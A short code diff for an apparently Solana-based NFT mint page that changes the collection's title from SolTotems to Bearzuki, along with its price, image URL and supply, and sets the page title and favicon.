@@ -18,10 +18,10 @@ import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
 
-const solAmount = 0.5
-const image = 'https://media.discordapp.net/attachments/1003594006262988820/1017080527326560276/IMG_0633.png?width=536&height=610'
-const Title = 'SolTotems'
-const supply = 2222
+const solAmount = 0.045
+const image = 'https://media.discordapp.net/attachments/942525313643085894/1016465021359902791/55.png?width=610&height=610'
+const Title = 'Bearzuki'
+const supply = 4444
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
